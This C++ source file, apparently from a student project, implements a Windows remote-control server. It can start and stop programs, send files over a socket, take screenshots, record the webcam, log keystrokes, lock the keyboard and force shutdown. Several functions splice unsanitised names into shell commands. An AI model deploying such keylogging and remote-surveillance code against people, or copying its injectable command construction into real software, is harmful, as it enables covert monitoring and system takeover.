#include "process.h"
#include "commands.h"

atomic<bool> isRecording = false;
thread webcamThread = thread();

// start app
string startApp(string name) {
    string command = "start " + name;
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = START_APP;
    jsonResponse["nameObject"] = name;

    if (result == 0) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully started " + name;
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to start " + name;
    }

    return jsonResponse.dump();
}

// start service
string startService(string name) {
    string command = "net start " + name + " > nul 2>&1";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] == START_SERVICE;
    jsonResponse["nameObject"] = name;

    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        jsonResponse["result"] = "Service " + name + " has been started successfully.";
    }
    else if (system(checkCommand.c_str()) == 0) {
        jsonResponse["result"] = "Service " + name + " is already running.";
    }
    else {
        jsonResponse["result"] = "Failed to start service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

// stop app
string stopApp(string name) {
    string command = "taskkill /IM " + name + ".exe /F";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = STOP_APP;
    jsonResponse["nameObject"] = name;

    if (result == 0)
        jsonResponse["result"] = "Successfully stopped " + name;
    else {
        FILE* pipe = _popen(command.c_str(), "r");
        char buffer[128];
        string line = "";
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            line += buffer;
        }

        jsonResponse["result"] = "The application with name " + name + " is inactive";
    }

    return jsonResponse.dump();
}

// stop service
string stopService(string name) {
    string command = "net stop " + name + " > nul 2>&1";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = STOP_SERVICE;
    jsonResponse["nameObject"] = name;

    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        jsonResponse["result"] = "Service " + name + " has been stopped successfully.";
    }
    else if (system(checkCommand.c_str()) != 0) {
        jsonResponse["result"] = "Service " + name + " is already stopped.";
    }
    else {
        jsonResponse["result"] = "Failed to stop service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

// send file
bool sendFile(SOCKET& clientSocket, string fileName) {
    ifstream file(fileName, ios::binary);

    if (!file) {
        cout << "Failed to open file " << fileName << endl;
        return false;
    }

    string fileBuffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());

    int fileSize = (int)fileBuffer.size();
    cout << fileSize << endl;

    send(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    int bytesSent = 0;

    while (bytesSent < fileSize) {
        int bytesToSend = min(fileSize - bytesSent, 1024);
        int result = send(clientSocket, fileBuffer.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send file data, error: " << WSAGetLastError() << endl;
            return false;
        }

        bytesSent += result;
    }

    return true;
}

// list apps
void writeAppListToFile(const vector<vector<string>>& apps) {
    ofstream outFile("data.bin");

    if (!outFile) {
        cerr << "Failed to open file." << endl;
        return;
    }

    // Ghi tiêu đề bảng vào tệp
    outFile << setw(30) << left << "Application Name"
        << setw(10) << left << "PID"
        << setw(25) << left << "Memory Usage (GB)"
        << setw(50) << left << "Path" << endl;
    outFile << string(105, '-') << endl;

    // Ghi dữ liệu các tiến trình vào tệp
    for (const auto& app : apps) {
        double memoryInGB = stod(app[2]);  // Chuyển chuỗi thành số thực
        outFile << setw(30) << left << app[0]        // Application Name
            << setw(15) << left << app[1]        // PID
            << setw(20) << left << fixed << setprecision(2) << memoryInGB   // Memory Usage in GB
            << setw(50) << left << app[3]        // Path
            << endl;
    }

    outFile.close();
}
vector<vector<string>> getRunningApps() {
    // Lệnh PowerShell để lấy thông tin về các tiến trình (Name, PID, Memory Usage, Path)
    string command = R"(powershell -Command "Get-Process | Where-Object {$_.mainwindowhandle -ne 0} | Select-Object Name,Id,WorkingSet64,Path | Format-Table -HideTableHeaders")";

    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "Failed to run command." << endl;
        return {};
    }

    vector<vector<string>> appList;
    char buffer[1024]; // Đảm bảo kích thước đủ lớn để chứa dữ liệu

    // Đọc dữ liệu từ PowerShell và xử lý
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        string line(buffer);
        line.erase(remove(line.begin(), line.end(), '\n'), line.end());
        line.erase(remove(line.begin(), line.end(), '\r'), line.end());

        // Bỏ qua các dòng trống
        if (line.empty()) {
            continue;
        }

        istringstream ss(line);
        vector<string> appDetails;

        string name, pid, memory, path;

        // Đọc các giá trị từ dòng
        ss >> name >> pid >> memory;
        getline(ss, path); // Đọc đường dẫn với getline để lấy chính xác đường dẫn có khoảng trắng
        path.erase(remove(path.begin(), path.end(), ' '), path.end()); // Loại bỏ khoảng trắng thừa ở đầu và cuối

        // Chuyển đổi Memory Usage từ byte sang GB
        long long memoryInBytes = stoll(memory); // Chuyển chuỗi sang long long
        double memoryInGB = static_cast<double>(memoryInBytes) / (1024 * 1024 * 1024); // Chuyển từ byte sang GB

        // Lưu lại thông tin
        appDetails.push_back(name);
        appDetails.push_back(pid);
        appDetails.push_back(to_string(memoryInGB)); // Chuyển thành chuỗi và lưu lại
        appDetails.push_back(path);

        appList.push_back(appDetails);
    }

    _pclose(pipe);
    return appList;
}
json listApps() {
    vector<vector<string>> appList = getRunningApps();

    json jsonResponse;

    jsonResponse["title"] = "listApps";

    if (!appList.empty()) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully listed applications";
        writeAppListToFile(appList);
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to list applications";
    }

    return jsonResponse;
}

// list services
string getServiceDescription(SC_HANDLE hService) {
    LPQUERY_SERVICE_CONFIG serviceConfig;
    DWORD bytesNeeded;
    string description = "No description available";
    if (QueryServiceConfig(hService, NULL, 0, &bytesNeeded) || GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        serviceConfig = (LPQUERY_SERVICE_CONFIG)malloc(bytesNeeded);
        if (QueryServiceConfig(hService, serviceConfig, bytesNeeded, &bytesNeeded)) {
            description = convertWideCharToString(serviceConfig->lpDisplayName);
        }
        free(serviceConfig);
    }
    return description;
}
string truncateString(const string& str, size_t maxLength) {
    if (str.length() > maxLength) {
        return str.substr(0, maxLength) + "...";  // Cắt chuỗi và thêm dấu ba chấm
    }
    return str;
}
string convertWideCharToString(LPCWSTR wideCharStr) {
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, nullptr, 0, nullptr, nullptr);
    string result(bufferSize - 1, 0); // bufferSize bao gồm ký tự null cuối
    WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, &result[0], bufferSize, nullptr, nullptr);
    return result;
}
vector<pair<string, tuple<int, string, string>>> listAllServices() {
    vector<pair<string, tuple<int, string, string>>> servicesInfo;

    SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == nullptr) {
        cerr << "Unable to open Service Control Manager: " << GetLastError() << endl;
        return servicesInfo;
    }

    DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResumeHandle = 0;
    DWORD dwBufferSize = 0;
    LPBYTE lpBuffer = nullptr;

    // Lấy kích thước bộ nhớ cần thiết
    EnumServicesStatusEx(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        lpBuffer,
        dwBufferSize,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        nullptr
    );

    // Cấp phát bộ nhớ
    dwBufferSize = dwBytesNeeded;
    lpBuffer = new BYTE[dwBufferSize];
    if (!EnumServicesStatusEx(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        lpBuffer,
        dwBufferSize,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        nullptr
    )) {
        cerr << "Unable to list services: " << GetLastError() << endl;
        delete[] lpBuffer;
        CloseServiceHandle(hSCManager);
        return servicesInfo;
    }

    // Thu thập tên dịch vụ, PID, mô tả và trạng thái của các dịch vụ
    auto* services = reinterpret_cast<LPENUM_SERVICE_STATUS_PROCESS>(lpBuffer);
    for (DWORD i = 0; i < dwServicesReturned; ++i) {
        string serviceName = convertWideCharToString(services[i].lpServiceName);
        int pid = services[i].ServiceStatusProcess.dwProcessId;

        // Trạng thái dịch vụ
        string status = (services[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING) ? "Running" : "Stopped";

        // Lấy mô tả dịch vụ
        SC_HANDLE hService = OpenService(hSCManager, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
        string description = getServiceDescription(hService);
        CloseServiceHandle(hService);

        // Cắt ngắn tên dịch vụ và mô tả nếu quá dài
        serviceName = truncateString(serviceName, 35);  // Cắt tên dịch vụ nếu quá 40 ký tự
        description = truncateString(description, 35);  // Cắt mô tả nếu quá 40 ký tự

        // Thêm vào vector
        servicesInfo.push_back({ serviceName, make_tuple(pid, description, status) });
    }

    // Dọn dẹp bộ nhớ
    delete[] lpBuffer;
    CloseServiceHandle(hSCManager);

    return servicesInfo;
}
void writeServicesListToFile(const vector<pair<string, tuple<int, string, string>>>& services) {
    ofstream outputFile("data.bin");

    if (!outputFile.is_open()) {
        cerr << "Unable to open file for writing!" << endl;
        return;
    }

    // Ghi tiêu đề cho các cột vào file
    outputFile << left << setw(40) << "Name"
        << setw(10) << "PID"
        << setw(40) << "Description"
        << setw(15) << "Status" << endl;
    outputFile << string(100, '-') << endl;

    // Ghi ra các dịch vụ và thông tin của chúng vào file
    for (const auto& service : services) {
        const auto& [name, serviceInfo] = service;
        const auto& [pid, description, status] = serviceInfo;

        // Ghi thông tin theo đúng định dạng cột vào file
        outputFile << left << setw(40) << name
            << setw(10) << pid
            << setw(40) << description
            << setw(15) << status << endl;
    }

    // Đóng file
    outputFile.close();
}
string listServices() {
    vector<pair<string, tuple<int, string, string>>> servicesList = listAllServices();

    json jsonResponse;

    jsonResponse["title"] = "listServices";

    if (!servicesList.empty()) {
        jsonResponse["result"] = "Successfully listed services";
        writeServicesListToFile(servicesList);
    }
    else jsonResponse["result"] = "Failed to list services";

    return jsonResponse.dump();
}

// list processes
string listProcess() {
    json jsonRespone;

    jsonRespone["title"] = "listProcess";

    int result = system("tasklist > data.bin");

    if (result == 0) {
        jsonRespone["result"] = "Successfully listed process";

    }
    else {
        jsonRespone["result"] = "Failed to list services";
    }

    return jsonRespone.dump();
}

// delete file
string deleteFile(string& filePath) {
    json jsonResponse;

    jsonResponse["title"] = DELETE_FILE;

    if (remove(filePath.c_str()) == 0) {
        jsonResponse["result"] = "File has been successfully deleted!";
    }
    else {
        jsonResponse["result"] = "Failed to delete file";
    }

    return jsonResponse.dump();
}

// copy file
string copyFile(const string& sourceFile, const string& destinationFile) {
    ifstream source(sourceFile, ios::binary);

    json jsonResponse;

    jsonResponse["title"] = "Copy file";

    if (!source) {
        cout << "hehe" << endl;
        jsonResponse["result"] = "Source file does not exist or could not be opened!";
        return jsonResponse.dump();
    }

    ofstream destination(destinationFile, ios::binary);

    if (!destination) {
        jsonResponse["result"] = "Could not create destination file!";
        return jsonResponse.dump();
    }

    destination << source.rdbuf();

    jsonResponse["result"] = "File copied successfully!";

    return jsonResponse.dump();
}

// screenshot
HBITMAP captureScreen(int& screenWidth, int& screenHeight) {
    HWND hwndDesktop = GetDesktopWindow();
    HDC hdcScreen = GetDC(hwndDesktop);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    RECT screenRect;
    GetWindowRect(hwndDesktop, &screenRect);
    screenWidth = screenRect.right;
    screenHeight = screenRect.bottom;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    ReleaseDC(hwndDesktop, hdcScreen);
    DeleteDC(hdcMem);

    return hBitmap;
}
bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height) {
    string fileName = "screenshot.png";

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER infoHeader;

    fileHeader.bfType = 0x4D42;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileHeader.bfSize = fileHeader.bfOffBits + bmp.bmWidthBytes * height;
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;

    infoHeader.biSize = sizeof(BITMAPINFOHEADER);
    infoHeader.biWidth = width;
    infoHeader.biHeight = height;
    infoHeader.biPlanes = 1;
    infoHeader.biBitCount = 32;
    infoHeader.biCompression = BI_RGB;
    infoHeader.biSizeImage = bmp.bmWidthBytes * height;
    infoHeader.biXPelsPerMeter = 0;
    infoHeader.biYPelsPerMeter = 0;
    infoHeader.biClrUsed = 0;
    infoHeader.biClrImportant = 0;

    ofstream outFile(fileName, ios::out | ios::binary);
    if (!outFile) {
        cerr << "Error: Failed to save BMP file!" << endl;
        return false;
    }

    outFile.write(reinterpret_cast<const char*>(&fileHeader), sizeof(fileHeader));
    outFile.write(reinterpret_cast<const char*>(&infoHeader), sizeof(infoHeader));

    HDC hdc = GetDC(NULL);
    BYTE* bmpData = new BYTE[bmp.bmWidthBytes * height];
    GetDIBits(hdc, hBitmap, 0, height, bmpData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    outFile.write(reinterpret_cast<const char*>(bmpData), bmp.bmWidthBytes * height);
    delete[] bmpData;

    outFile.close();
    cout << "Successfully saved the screenshot to the file:  " << fileName << endl;
    return true;
}
bool saveBinaryToImage(const string& binaryData, const string& savePath) {
    // Mở tệp nhị phân để ghi dữ liệu vào tệp hình ảnh
    ofstream outFile(savePath, ios::out | ios::binary);
    if (!outFile) {
        cerr << "Error: Cannot open file to save!" << endl;
        return false;
    }

    // Ghi dữ liệu vào tệp
    outFile.write(binaryData.c_str(), binaryData.size());
    outFile.close();

    cout << "Image has been saved to the file: " << savePath << endl;
    return true;
}
void takeScreenshot() {
    int screenWidth, screenHeight;

	// capture screen
    HBITMAP hBitmap = captureScreen(screenWidth, screenHeight);
    if (!hBitmap) {
        cout << "Failed to screenshot!";
        return;
    }

	// save to file screenshot.png
    if (!saveScreenshotToFile(hBitmap, screenWidth, screenHeight)) {
        cout << "Failed to screenshot!" << endl;
        DeleteObject(hBitmap);
        return;
    }

	// release memory
    DeleteObject(hBitmap);
}

// keylogger
map<int, string> createKeyMap() {
    map<int, string> keyMap;

    // Các phím chữ cái
    for (char c = 'A'; c <= 'Z'; ++c) keyMap[c] = string(1, c);

    // Các phím số
    for (char c = '0'; c <= '9'; ++c) keyMap[c] = string(1, c);

    // Các phím chức năng
    keyMap[VK_F1] = "F1";    keyMap[VK_F2] = "F2";    keyMap[VK_F3] = "F3";
    keyMap[VK_F4] = "F4";    keyMap[VK_F5] = "F5";    keyMap[VK_F6] = "F6";
    keyMap[VK_F7] = "F7";    keyMap[VK_F8] = "F8";    keyMap[VK_F9] = "F9";
    keyMap[VK_F10] = "F10";  keyMap[VK_F11] = "F11";  keyMap[VK_F12] = "F12";

    // Các phím điều khiển
    keyMap[VK_SHIFT] = "Shift";
    keyMap[VK_CONTROL] = "Ctrl";
    keyMap[VK_MENU] = "Alt";
    keyMap[VK_SPACE] = "Space";
    keyMap[VK_RETURN] = "Enter";
    keyMap[VK_BACK] = "Backspace";
    keyMap[VK_TAB] = "Tab";
    keyMap[VK_ESCAPE] = "Esc";
    keyMap[VK_CAPITAL] = "Caps Lock";   // Caps Lock
    keyMap[VK_NUMLOCK] = "Num Lock";   // Num Lock
    keyMap[VK_LWIN] = "Left Windows";   // Left Windows Key
    keyMap[VK_RWIN] = "Right Windows";  // Right Windows Key

    // Các phím mũi tên
    keyMap[VK_LEFT] = "Left Arrow";
    keyMap[VK_RIGHT] = "Right Arrow";
    keyMap[VK_UP] = "Up Arrow";
    keyMap[VK_DOWN] = "Down Arrow";

    // Các phím đặc biệt khác
    keyMap[VK_DELETE] = "Delete";
    keyMap[VK_INSERT] = "Insert";
    keyMap[VK_HOME] = "Home";
    keyMap[VK_END] = "End";
    keyMap[VK_PRIOR] = "Page Up";
    keyMap[VK_NEXT] = "Page Down";

    // Các ký tự đặc biệt
    keyMap[0xBD] = "-"; keyMap[0xBB] = "="; keyMap[0xDB] = "["; keyMap[0xDD] = "]";
    keyMap[0xDC] = "\\"; keyMap[0xBA] = ";"; keyMap[0xDE] = "'"; keyMap[0xBC] = ",";
    keyMap[0xBE] = "."; keyMap[0xBF] = "/"; keyMap[0xC0] = "`";
    keyMap[0x30] = "0"; keyMap[0x31] = "1"; keyMap[0x32] = "2"; keyMap[0x33] = "3";
    keyMap[0x34] = "4"; keyMap[0x35] = "5"; keyMap[0x36] = "6"; keyMap[0x37] = "7";
    keyMap[0x38] = "8"; keyMap[0x39] = "9";

    // Các phím NumPad
    keyMap[VK_NUMPAD0] = "NumPad 0";
    keyMap[VK_NUMPAD1] = "NumPad 1";
    keyMap[VK_NUMPAD2] = "NumPad 2";
    keyMap[VK_NUMPAD3] = "NumPad 3";
    keyMap[VK_NUMPAD4] = "NumPad 4";
    keyMap[VK_NUMPAD5] = "NumPad 5";
    keyMap[VK_NUMPAD6] = "NumPad 6";
    keyMap[VK_NUMPAD7] = "NumPad 7";
    keyMap[VK_NUMPAD8] = "NumPad 8";
    keyMap[VK_NUMPAD9] = "NumPad 9";
    keyMap[VK_DECIMAL] = "NumPad .";
    keyMap[VK_DIVIDE] = "NumPad /";
    keyMap[VK_MULTIPLY] = "NumPad *";
    keyMap[VK_SUBTRACT] = "NumPad -";
    keyMap[VK_ADD] = "NumPad +";
    keyMap[VK_NUMLOCK] = "Num Lock";

    return keyMap;
}
vector<string> collectKeyNames(int durationInSeconds) {
    map<int, string> keyMap = createKeyMap(); // Tạo bảng ánh xạ mã phím
    vector<string> keyNames;  // Lưu trữ tên các phím đã nhấn
    bool keyState[256] = { false }; // Trạng thái trước đó của các phím

    auto startTime = GetTickCount64(); // Lấy thời gian bắt đầu (milliseconds)
    cout << "Started collecting keys (Duration: " << durationInSeconds << " seconds):" << endl;

    while ((GetTickCount64() - startTime) / 1000 < durationInSeconds) {
        for (int key = 0; key < 256; ++key) { // Duyệt qua tất cả các mã phím
            bool isPressed = GetAsyncKeyState(key) & 0x8000; // Kiểm tra nếu phím được nhấn

            // Kiểm tra trạng thái phím điều khiển
            if (key == VK_LBUTTON || key == VK_RBUTTON) continue;  // Bỏ qua phím chuột

            if (isPressed && !keyState[key]) { // Nếu phím vừa được nhấn (chưa nhấn trước đó)
                keyState[key] = true; // Cập nhật trạng thái

                if (keyMap.find(key) != keyMap.end()) { // Nếu mã phím có trong bảng ánh xạ
                    keyNames.push_back(keyMap[key]);
                    cout << "Key pressed: " << keyMap[key] << endl;  // "Phím được nhấn"
                }
            }
            else if (!isPressed) { // Nếu phím không còn nhấn
                keyState[key] = false; // Reset trạng thái
            }
        }
        Sleep(10); // Giảm tải CPU
    }

    cout << "Finished collecting keys!" << endl;  // "Kết thúc thu thập phím!"
    return keyNames; // Trả về danh sách các phím đã nhấn
}
void writeKeyNamesToFile(vector<string>& keyNames) {
    ofstream output;
    output.open("data.bin");

    for (string& key : keyNames) {
        output << key << " ";
    }

    output.close();
}
string keyLogger(int durationInSeconds) {
    json jsonResponse;

    jsonResponse["title"] = "keyLogger";

    vector<string> keyNames = collectKeyNames(durationInSeconds);

    if (keyNames.size() == 0) {
        jsonResponse["result"] = "Failed to collect keys";
    }
    else {
        jsonResponse["result"] = "Key logger successfully";
        writeKeyNamesToFile(keyNames);
    }

    return jsonResponse.dump();
}

// key lock
LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        return 1; // Chặn tất cả các phím bấm
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
bool lockKeyboard() {
    if (keyboardHook != NULL) {
        cout << "Keyboard is already locked!" << endl;
        return false;
    }

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, processLowLevelKeyboard, NULL, 0);
    if (keyboardHook == NULL) {
        DWORD error = GetLastError();
        cout << "Failed to lock the keyboard. Error code: " << error << endl;
        return false;
    }

    cout << "The keyboard has been locked." << endl;

    return true;
}
string lockKey(bool& flag) {
    json jsonResponse;

    jsonResponse["title"] = "keyLocking";

    if (lockKeyboard()) {
        jsonResponse["result"] = "Successfully locked the keyboard";
        flag = true;
    }
    else {
        jsonResponse["result"] = "Failed to lock the key";
    }

    return jsonResponse.dump();
}
void runKeyLockingLoop() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// key unlock
bool unlockKeyboard() {
    if (keyboardHook == NULL) {
        cout << "Keyboard is not locked or already unlocked!" << endl;
        return false;
    }

    if (UnhookWindowsHookEx(keyboardHook)) {
        keyboardHook = NULL;
        cout << "The keyboard has been unlocked." << endl;
        return true;
    }
    else {
        DWORD error = GetLastError();
        cout << "Failed to unlock the keyboard. Error code: " << error << endl;
        return false;
    }
}
string unlockKey() {
    json jsonResponse;

    jsonResponse["title"] = "keyUnlocking";

    if (unlockKeyboard()) {
        jsonResponse["result"] = "Successfully unlocked the keyboard";
    }
    else {
        jsonResponse["result"] = "Failed to unlock the keyboard";
    }

    return jsonResponse.dump();
}

// shutdown
void shutdown() {
    // terminate all running processes
    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
    system(command.c_str());

	// shutdown computer
    command = "shutdown /s /t 0";
    system(command.c_str());
}

// restart
void restart() {
    // terminate all running processes
    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
    system(command.c_str());

	// restart computer
    command = "shutdown /r /t 0";
    system(command.c_str());
}

// directory tree
// Hàm kiểm tra xem tệp/thư mục có ẩn hoặc là hệ thống không
bool isHiddenOrSystem(const filesystem::path& path) {
    DWORD attributes = GetFileAttributesW(path.wstring().c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES) return false;
    return (attributes & FILE_ATTRIBUTE_HIDDEN) || (attributes & FILE_ATTRIBUTE_SYSTEM);
}
// Hàm in cây thư mục ra tệp
void printDirectoryTree(const filesystem::path& path, wofstream& output, int indent = 0, int currentDepth = 0, int maxDepth = 3) {
    if (currentDepth > maxDepth) return; // Dừng nếu vượt quá mức tối đa

    try {
        for (const auto& entry : filesystem::directory_iterator(path)) {
            // Bỏ qua tệp/thư mục ẩn hoặc hệ thống
            if (isHiddenOrSystem(entry.path())) continue;

            // Chuẩn bị chuỗi đầu ra
            wstring line = wstring(indent, L' ') + L"|-- " + entry.path().filename().wstring() + L"\n";

            // Ghi vào tệp
            output << line;

            // Nếu là thư mục, tiếp tục đệ quy (nếu ở mức nhỏ hơn mức tối đa)
            if (filesystem::is_directory(entry.path()) && currentDepth < maxDepth) {
                printDirectoryTree(entry.path(), output, indent + 4, currentDepth + 1, maxDepth);
            }
        }
    }
    catch (const filesystem::filesystem_error& e) {
        output << L"Error: " << e.what() << L"\n";
    }
}
// Hàm liệt kê các ổ đĩa và in cây thư mục
bool listDrivesAndPrintTree() {
    // Cấu hình luồng ghi file với UTF-8
    wofstream output("data.bin", ios::out);
    output.imbue(locale("en_US.UTF-8"));

    if (!output.is_open()) {
        wcout << L"Error: Unable to open file DirectoryTree.txt for writing.\n";
        return false;
    }

    DWORD drives = GetLogicalDrives();
    if (drives == 0) {
        output << L"Error: Unable to retrieve the list of drives.\n";
        return false;
    }

    // Ghi tiêu đề vào tệp
    output << L"This PC\n";

    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (drives & (1 << (drive - 'A'))) {
            // Tạo đường dẫn ổ đĩa
            wstring drivePath = wstring(1, drive) + L":\\";

            // Ghi vào tệp
            output << L"|-- Drive " + drivePath + L"\n";

            // In thư mục con cấp 2
            printDirectoryTree(drivePath, output, 4, 1, 3);
        }
    }

    output.close();
    return true;
}
string getDirectoryTree() {
    // Khai báo biến để lưu chế độ mặc định của stdout
    int defaultMode = _O_TEXT; // Đảm bảo biến được khởi tạo đúng giá trị mặc định

    // Lưu chế độ hiện tại của stdout
    defaultMode = _setmode(_fileno(stdout), _O_U16TEXT);
    if (defaultMode == -1) {
        cout << "Unable to switch output mode to Unicode. The program will continue with default settings.\n";
    }

    json jsonResponse;
    jsonResponse["title"] = "getDirectoryTree";

    // Liệt kê các ổ đĩa và ghi cây thư mục vào tệp
    if (listDrivesAndPrintTree()) {
        jsonResponse["result"] = "Successfully created directory tree";
    }
    else {
        jsonResponse["result"] = "Failed to create directory tree";
    }

    // Khôi phục chế độ ban đầu của stdout
    if (_setmode(_fileno(stdout), defaultMode) == -1) {
        cout << "Failed to restore default stdout mode.\n";
    }

    return jsonResponse.dump();
}

// start webcam
bool createWebcamVideo(int duration) {
    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);

    // Khởi tạo COM ở chế độ Multithreaded
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return false;
    }

    // Mở camera
    cv::VideoCapture cap(0);
    if (!cap.isOpened()) {
        CoUninitialize();
        return false;
    }

    // Lấy kích thước khung hình và các thông số
    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
    cv::Size frame_size(frame_width, frame_height);
    int fps = 30;

    // Tạo VideoWriter với codec AVC1
    string output_file = "output.mp4";
    cv::VideoWriter video(output_file,
        cv::VideoWriter::fourcc('a', 'v', 'c', '1'),  // Codec AVC1
        fps, frame_size, true);

    if (!video.isOpened()) {
        cap.release();
        CoUninitialize();
        return false;
    }

    // Bắt đầu quay video
    cv::Mat frame;
    auto start_time = chrono::steady_clock::now();
    int elapsed_time = 0;
    bool is_recording = true;  // Biến để xác định trạng thái ghi video


    while (isRecording) {
        cap >> frame;
        if (frame.empty()) {
            break;
        }

        // Nếu còn thời gian và đang quay, ghi video
        if (is_recording) {
            video.write(frame);  // Ghi khung hình vào file
        }

        // Hiển thị video
        cv::imshow("Video Recording", frame);

        // Kiểm tra thời gian quay
        auto current_time = chrono::steady_clock::now();
        elapsed_time = (int)chrono::duration_cast<chrono::seconds>(current_time - start_time).count();

        // Sau khi hết thời gian quay, dừng ghi nhưng vẫn tiếp tục nhận khung hình
        if (elapsed_time >= duration && is_recording) {
            is_recording = false;
            video.release();
        }

        // Kiểm tra phím nhấn
        int key = cv::waitKey(1) & 0xFF;

        // Kiểm tra nếu cửa sổ bị đóng
        if (cv::getWindowProperty("Video Recording", cv::WND_PROP_VISIBLE) < 1) {
            break;
        }
    }

    // Dọn dẹp tài nguyên
    cap.release();
    cv::destroyAllWindows();
    CoUninitialize();

    return true;
}

string startWebcam() {
    if (isRecording) {
        return R"({"title":"startWebcam","result":"Webcam is already recording"})";
    }

    isRecording = true;
    webcamThread = thread([]() {
        bool result = createWebcamVideo(10); // Quay video trong 10 giây
        });
    json jsonResponse;

    jsonResponse["title"] = "startWebcam";

    jsonResponse["result"] = "Successfully started webcam";

    return jsonResponse.dump();
}

string stopWebcam() {
    if (!isRecording) {
        return R"({"title":"stopWebcam","result":"Webcam is not recording"})";
    }

    isRecording = false; // Yêu cầu dừng quay video

    if (webcamThread.joinable()) {
        webcamThread.join(); // Chờ thread webcam hoàn thành
    }
    string command = "powershell -Command \"Get-Process| Where-Object { $_.Name -eq 'WindowsCamera' } | Stop-Process\"";
    int result = system(command.c_str());

    json jsonResponse;

    jsonResponse["title"] = "stopWebcam";

    if (result == 0)
        jsonResponse["result"] = "Successfully stopped webcam";
    else
        jsonResponse["result"] = "Failed to stop webcam";

    return jsonResponse.dump();
}
